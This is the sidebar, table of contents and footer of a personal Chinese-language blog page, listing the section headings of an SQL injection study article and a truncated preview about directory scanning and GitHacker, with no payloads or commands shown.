dirsearch   ffuf     适用场景：题目信息不足时的通用手段 限制情况：部分比赛禁止目录扫描（资源消耗大） 典型发现：www.zip源码包、管理后台路径    常见常用敏感文件   GitHacker工具使用   - &lt;font style=&quot;color:#5C8D07;&quot;&gt;通过pip安装GitHacker&lt;/font&gt; - &lt;font style=&quot;color:#5C8D07;&quot;&gt;操作流程&lt;/font&gt;&lt;fo...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Only0901</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to Only0901's Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E4%B8%8E%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL 注入基础与联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">**数据库基础知识 **</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E5%86%B5"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">数据库概况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql-%E7%9A%84%E5%85%83%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Mysql 的元数据仓库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ORDER-BY-%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">ORDER BY 语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UNION-%E6%93%8D%E4%BD%9C"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">UNION 操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GROUP-CONCAT-%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">GROUP_CONCAT()函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E9%87%8C%E9%9D%A2%E6%9C%89%E7%89%B9%E6%AE%8A%E5%90%AB%E4%B9%89%EF%BC%88%E9%A1%B5%E9%9D%A2%E9%94%9A%E7%82%B9%EF%BC%89%EF%BC%8C%E5%9C%A8-GET-%E8%AF%B7%E6%B1%82%E4%B8%AD%E4%B8%8D%E4%BC%9A%E8%A2%AB%E5%8F%91%E9%80%81%E5%88%B0%E5%90%8E%E7%AB%AF%EF%BC%8C%E5%A6%82%E6%9E%9C%E8%A6%81%E8%AE%A9%E5%AE%83%E5%8F%91%E9%80%81%E5%88%B0"><span class="toc-number">2.</span> <span class="toc-text">:在浏览器里面有特殊含义（页面锚点），在 GET 请求中不会被发送到后端，如果要让它发送到</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SELECT-%E4%B8%8D%E5%87%BA%E7%8E%B0-from-%E7%9A%84%E7%94%A8%E6%B3%95"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">**SELECT 不出现 from 的用法 **</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">2.1.</span> <span class="toc-text">SQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">SQL 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">SQL 注入方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.4.</span> <span class="toc-text">SQL 注入的一些常见位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.5.</span> <span class="toc-text">SQL 注入的步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%9A%E9%80%9A%E8%BF%87%E6%8F%92%E5%85%A5%E9%9D%9E%E9%A2%84%E6%9C%9F%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%AE%A9%E9%A1%B5%E9%9D%A2%E6%8A%A5%E9%94%99%EF%BC%88%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%B9%9F%E6%9C%89%E9%A1%B5%E9%9D%A2%E5%BC%82%E5%B8%B8%EF%BC%89"><span class="toc-number">2.5.0.1.</span> <span class="toc-text">**1、判断注入点：通过插入非预期数据，让页面报错（报错信息，也有页面异常） **</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%EF%BC%88%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%8C%E6%88%96%E8%80%85%E5%8D%95%E5%BC%95%E5%8F%B7-%E6%8B%AC%E5%8F%B7%EF%BC%8C%E5%8F%8C%E5%BC%95%E5%8F%B7-%E6%8B%AC%E5%8F%B7%EF%BC%89"><span class="toc-number">2.5.0.2.</span> <span class="toc-text">**2、判断闭合方式（单引号，双引号，或者单引号 + 括号，双引号 + 括号） **</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%88%A4%E6%96%AD%E5%8F%AF%E4%BB%A5%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B0%EF%BC%88%E5%88%97%E6%95%B0%EF%BC%89"><span class="toc-number">2.5.0.3.</span> <span class="toc-text">**3、判断可以查询的字段个数（列数） **</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E7%9A%84%E4%BD%8D%EF%BC%88%E5%93%AA%E4%B8%AA%E4%BD%8D%E7%BD%AE%E7%9A%84%E6%95%B0%E6%8D%AE%E8%A2%AB%E6%98%BE%E7%A4%BA%E5%88%B0%E4%BA%86%E9%A1%B5%E9%9D%A2%E4%B8%8A%EF%BC%89"><span class="toc-number">2.5.0.4.</span> <span class="toc-text">**4、判断回显的位（哪个位置的数据被显示到了页面上） **</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">2.5.0.5.</span> <span class="toc-text">**5、获取数据库名 **</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E5%BA%94%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">2.5.0.6.</span> <span class="toc-text">**6、获取数据库对应的表名 **</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%9F%90%E4%B8%AA%E8%A1%A8%E7%9A%84%E5%88%97%E5%90%8D-%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.5.0.7.</span> <span class="toc-text">7、获取数据库中某个表的列名(字段名)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8%E3%80%81%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">2.5.0.8.</span> <span class="toc-text">8、获取数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.6.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">2.6.0.1.</span> <span class="toc-text">注入流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">2.6.0.2.</span> <span class="toc-text">常用知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#length%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0"><span class="toc-number">2.6.0.2.1.</span> <span class="toc-text">length（）函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#substr-%E5%87%BD%E6%95%B0%E6%88%96%E8%80%85-substring-%E5%87%BD%E6%95%B0"><span class="toc-number">2.6.0.2.2.</span> <span class="toc-text">substr()函数或者 substring()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#limit-%E5%AD%97%E5%8F%A5"><span class="toc-number">2.6.0.2.3.</span> <span class="toc-text">limit 字句</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.7.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.7.0.1.</span> <span class="toc-text">时间盲注描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-1"><span class="toc-number">2.7.0.2.</span> <span class="toc-text">注入流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="toc-number">2.7.0.3.</span> <span class="toc-text">常用知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sleep-%E5%87%BD%E6%95%B0"><span class="toc-number">2.7.0.3.1.</span> <span class="toc-text">sleep()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IF-%E5%87%BD%E6%95%B0"><span class="toc-number">2.7.0.3.2.</span> <span class="toc-text">IF()函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.8.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.8.0.1.</span> <span class="toc-text">报错注入描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="toc-number">2.8.0.2.</span> <span class="toc-text">常用知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml-%E5%87%BD%E6%95%B0"><span class="toc-number">2.8.0.2.1.</span> <span class="toc-text">updatexml()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#concat-%E5%87%BD%E6%95%B0"><span class="toc-number">2.8.0.2.2.</span> <span class="toc-text">concat()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-number">2.8.0.2.3.</span> <span class="toc-text">extractvalue()函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">2.9.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.9.0.1.</span> <span class="toc-text">宽字节注入描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="toc-number">2.9.0.2.</span> <span class="toc-text">常用知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%E8%BD%AC%E4%B9%89"><span class="toc-number">2.9.0.2.1.</span> <span class="toc-text">宽字节绕过转义</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-2"><span class="toc-number">2.9.0.2.2.</span> <span class="toc-text">注入流程</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNSlog-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.10.</span> <span class="toc-text">DNSlog 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.10.0.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9-4"><span class="toc-number">2.10.0.2.</span> <span class="toc-text">常用知识点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP"><span class="toc-number">2.11.</span> <span class="toc-text">SQLMAP</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/06/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img src="/images/QQ20251206-195428.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2025/12/06/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a><time datetime="2025-12-06T11:31:31.000Z" title="发表于 2025-12-06 19:31:31">2025-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/27/web%E5%AE%89%E5%85%A8/" title="web安全"><img src="/images/980.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web安全"/></a><div class="content"><a class="title" href="/2025/11/27/web%E5%AE%89%E5%85%A8/" title="web安全">web安全</a><time datetime="2025-11-27T08:57:36.000Z" title="发表于 2025-11-27 16:57:36">2025-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/26/hello-world/" title="Hello World"><img src="/images/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2025/11/26/hello-world/" title="Hello World">Hello World</a><time datetime="2025-11-26T13:13:38.000Z" title="发表于 2025-11-26 21:13:38">2025-11-26</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Only0901</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>